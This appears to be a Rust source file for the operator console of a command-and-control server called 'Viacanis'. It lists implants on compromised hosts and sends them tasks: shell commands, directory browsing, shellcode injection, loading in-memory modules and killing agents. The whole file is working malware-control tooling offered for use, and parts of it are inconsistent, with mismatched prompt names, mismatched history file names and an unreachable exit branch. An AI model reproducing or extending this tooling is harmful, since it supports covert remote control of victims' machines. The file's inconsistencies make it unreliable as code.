//LOCAL IMPORT
use crate::colors::*;
use crate::agents::*;
use crate::cli::logo::print_logo;

// OTHER DEPENDENCIES
use rustyline;
use std::fs::File;
use rustyline::Editor;
use shellwords::split;
use prettytable::{Table, Row, Cell};
use uuid::Uuid;
use lazy_static::lazy_static;
use std::sync::{RwLock, Arc};
use colored::Colorize;




lazy_static! {
    pub static ref SHELLMENUCONTEXT: Arc<RwLock<&'static str>> = Arc::new(RwLock::new("main"));
    pub static ref PROMPT: Arc<RwLock<String>> = Arc::new(RwLock::new("\x1b[32mVIACANIS@SERVER>> ".to_string()));
    pub static ref IMP_ID: Arc<RwLock<Uuid>> = Arc::new(RwLock::new(Uuid::nil()));


}

pub fn start_cli(){
    let mut rl = Editor::<()>::new();
    if rl.load_history("./viacanisserver_history").is_err() {
        println!("No previous history.");
        File::create("./viacanisserver_history").expect("Couldn't create history file");
    }

    print_logo();

    loop {
        let tmp = PROMPT.clone();
        let line = rl.readline(&tmp.read().unwrap());
        let cmdline = split(&line.unwrap());
        if cmdline.clone().unwrap().len() > 0{
            let cmd = &cmdline.clone().unwrap();
            if cmd.len() > 0 {
                let context = SHELLMENUCONTEXT.clone();
                let menu_context = context.read().unwrap();
                match *menu_context{
                    "main" =>{
                        if cmd.len() > 0{
                            match cmd[0].as_str(){
                                "agent" => {
                                    if cmd.len() > 1{
                                        colors::note_logger("Main Context: Agent".to_string());
                                    }
                                    continue;

                                }
                                "interact" =>{
                                    if cmd.len() > 1{
                                        colors::note_logger("Main Context: Interact".to_string());
                                    }
                                    drop(menu_context);
                                    drop(context);
                                    menu_agent(cmd.to_vec());
                                    continue;

                                }
                                "list" =>{
                                    colors::note_logger("Main Context: List".to_string());
                                    display_implants();
                                    continue;

                                }
                                "sessions" => {
                                    colors::note_logger("Main Context: Sessions".to_string());
                                    continue;

                                }
                                "use" =>{
                                    colors::note_logger("Main Context: Use".to_string());
                                    continue;

                                }
                                "help" => {
                                    help_menu_main();
                                    continue;

                                }
                                _ => {
                                    colors::error_logger("Empty Command: Execute Commands or Get Info, Probably".to_string());
                                    help_menu_main();
                                    continue;

                                }
                            }
                        }
                    }

                    "agent" => {
                        if cmd.len() > 0{
                            match cmd[0].as_str(){
                                "back" => {
                                    colors::note_logger("Going Back To Main Context".to_string());
                                    drop(menu_context);
                                    drop(context);
                                    menu_set_main();
                                    continue;

                                }
                                "main" => {
                                    colors::note_logger("Going Back to Main Context".to_string());
                                    drop(menu_context);
                                    drop(context);
                                    menu_set_main();
                                    continue;

                                }
                                "cmd" => {
                                    if cmd.len() > 1{
                                        colors::note_logger("Agent Context: Command".to_string());
                                        agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                        continue;

                                    }
                                }
                                "ls" =>{
                                    colors::note_logger("Agent Context: List Directory".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }
                                "pwd" => {
                                    colors::note_logger("Agent Context: Get Current Working Directory".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }
                                "cd" =>{
                                    colors::note_logger("Agent Context: Change Direcotry".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }

                                "shinject" =>{
                                    colors::note_logger("Agent Context: Shellcode Inject".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }

                                "load" =>{
                                    colors::note_logger("Agent Context: Shellcode Inject".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }

                                "kill" =>{
                                    colors::note_logger("Agent Context: Killing Agent".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }

                                
                                "use" =>{
                                    colors::note_logger("Agent Context: Use Module".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }

                                "move" =>{
                                    colors::note_logger("Agent Context: Move Module".to_string());
                                    agents::add_job(*IMP_ID.clone().read().unwrap(), cmd.clone());
                                    continue;

                                }
                                
                                
                                "help" => {
                                    help_menu_agent();
                                    continue;

                                }
                                _ => {
                                    colors::error_logger("Empty Command: Execute Commands or Get Info, Probably".to_string());
                                    help_menu_agent();
                                    continue;

                                }
                            }
                        }
                    }

                    "exit" => {
                        rl.save_history("./teamserver_history").expect("Couldn't save history");
                        std::process::exit(0);
                    },

                    _ => {
                        colors::error_logger("No Command".to_string());
                    }
                }
            }
        }
    }
}


fn menu_set_main(){
    let mut menu = SHELLMENUCONTEXT.write().unwrap();
    let mut prompt = PROMPT.write().unwrap();
    let default_prompt = "\x1b[32mDragos@Teamserver>> ";
    *prompt = default_prompt.to_string();
    let shell_menu_context = "main";
    *menu = shell_menu_context;
    return;
}

fn menu_set_agent<'a>(session_id: String, hostname: String){
    //let shell_fut = SHELLMENUCONTEXT.write().map(|mut guard| { *guard = "agent";});
    //spawn(shell_fut).wait_future().expect("spawn");

    let mut shell_menu = SHELLMENUCONTEXT.write().unwrap();
    *shell_menu = "agent";
    let mut prompt = PROMPT.write().unwrap();
    let agent_prompt = format!("\x1b[32mSession-{}{}{}>> ", session_id.red().bold(), "@".green() ,hostname.yellow()); 
    *prompt = agent_prompt.clone();
    return;

}

fn menu_agent<'a> (cmd: Vec<String>) {
    match cmd[0].as_str(){
        "interact" => {
            let cmd_len = cmd.clone().len();
            if cmd.len() > 1 {
                let session_id = cmd[1].to_string();
                let implants = agents::AGENTS.read().unwrap().lock().unwrap().clone();
                for (id, imp) in implants.clone().iter() {
                    if id.to_string() == session_id.clone() {
                        menu_set_agent(session_id.clone(), imp.hostname.clone());
                        *IMP_ID.write().unwrap() = imp.id.clone();
                        let mut table = Table::new();
                        table.add_row(row!["Session ID","Agent GUID", "Platform", "User", "Host", "Transport", "Status"]);
                        table.add_row(row![id, imp.id.to_string(), imp.platform, imp.username, imp.hostname, imp.proto, "Connected"]);
                        table.printstd();
                        break
                    }
                }
                return;
            } else{
                return;
            }
        }

        _ => return
    }

}

fn display_implants() {
    let mut table = Table::new();
    table.add_row(row!["Session ID","Agent GUID", "Platform", "User", "Host", "Transport", "Status"]);
    let implants = agents::AGENTS.read().unwrap().lock().unwrap().clone();
    for (id, imp) in implants.iter() {
        table.add_row(row![id, imp.id.to_string(), imp.platform, imp.username, imp.hostname, imp.proto, "Connected"]);
    }
    // Print the table to stdout
    table.printstd();
}

fn help_menu_main() {
    let mut table = Table::new();
    table.add_row(row!["agent", "Interact with agents or list agents", "interact, list"]);
    table.add_row(row!["exit", "Exit and close the Viacanis server", ""]);
    table.add_row(row!["interact", "Interact with an agent.", ""]);
    table.add_row(row!["quit", "Exit and close the Viacanis server", ""]);
    table.add_row(row!["remove", "Remove or delete a DEAD agent from the server"]);
    table.add_row(row!["list", "List all agents session information.", ""]);
    table.add_row(row!["use", "Use a function of Viacanis", "module"]);
    table.add_row(row!["version", "Print the Viacanis server version", ""]);
    table.add_row(row!["*", "Anything else will be execute on the host operating system", ""]);
    // Print the table to stdout
    table.printstd();
}

fn help_menu_agent() {
    let mut table = Table::new();
    table.add_row(row!["agent", "Interact with agents or list agents", "interact, list"]);
    table.add_row(row!["back", "Return to the main menu", ""]);
    table.add_row(row!["info", "Show information about a module"]);
    table.add_row(row!["main", "Return to the main menu", ""]);
    table.add_row(row!["cmd", "Execute shell command via 'cmd /c' or 'sh -c' i.e 'shell ipconfig /all' ",""]);
    table.add_row(row!["pwd", "Get Working Directory",""]);
    table.add_row(row!["ls", "List contents of current directory",""]);
    table.add_row(row!["cd", "Change Directory",""]);
    table.add_row(row!["load", "Loads in Memory Modules",""]);
    table.add_row(row!["use", "Use in Memory Modules",""]);
    table.add_row(row!["run", "Run or execute the module", ""]);
    table.add_row(row!["set", "Set the value for one of the module's options", "<option name> <option value>"]);
    table.add_row(row!["show", "Show information about a module or its options", "info, options"]);
    table.add_row(row!["unset", "Clear a module option to empty", "<option name>"]);
    table.add_row(row!["*", "Anything else will be execute on the host operating system", ""]);
    // Print the table to stdout
    table.printstd();
}

